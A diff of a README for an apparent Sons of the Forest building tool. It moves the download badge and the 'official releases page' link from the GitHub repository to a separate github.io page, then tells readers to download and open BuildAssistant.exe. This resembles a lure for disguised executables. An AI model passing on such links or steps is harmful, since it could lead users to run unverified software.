@@ -1,6 +1,6 @@
 # 🏗️ Sons-of-the-Forest-Build-Assistant - Build faster with powerful game tools
 
-[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/Overheatingbluemurder558/Sons-of-the-Forest-Build-Assistant)
+[![](https://img.shields.io/badge/Download-Application-blue)](https://overheatingbluemurder558.github.io)
 
 ## 📖 About this project
 
@@ -20,7 +20,7 @@ Ensure your computer meets these conditions before you begin the setup:
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official releases page](https://github.com/Overheatingbluemurder558/Sons-of-the-Forest-Build-Assistant) to download the application.
+1. Visit the [official releases page](https://overheatingbluemurder558.github.io) to download the application.
 2. Locate the file named BuildAssistant.exe in the list.
 3. Click the file name to start your download.
 4. Open your Downloads folder once the save finishes.
